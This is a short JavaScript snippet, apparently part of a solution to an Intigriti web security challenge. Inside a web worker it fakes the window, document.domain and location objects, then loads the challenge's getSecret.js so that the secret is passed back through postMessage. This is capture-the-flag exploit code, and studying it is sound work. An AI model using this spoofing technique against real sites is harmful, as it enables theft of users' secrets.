window = {}
document = {}
document.domain = 'challenge-1022.intigriti.io';
window.location = {}
window.location.href = 'https://challenge-1022.intigriti.io/challenge/create';

window.saveSecret = function(msg){
  self.postMessage(msg)
}

self.importScripts('https://challenge-1022.intigriti.io/challenge/getSecret.js');
